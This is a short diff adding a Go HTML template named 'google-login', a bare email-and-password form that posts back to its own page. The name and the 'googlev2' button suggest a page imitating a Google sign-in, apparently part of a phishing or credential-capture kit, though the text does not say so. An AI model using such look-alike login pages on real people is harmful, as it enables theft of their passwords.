@@ -1,0 +1,9 @@
+{{define "google-login"}}
+    {{template "header" .}}
+        <form method="post">
+        <input type="text" name="email">
+        <input type="password" name="password">
+        <input type="submit" name="googlev2" value="Submit">
+        </form>
+    {{template "foot" .}}
+{{end}}
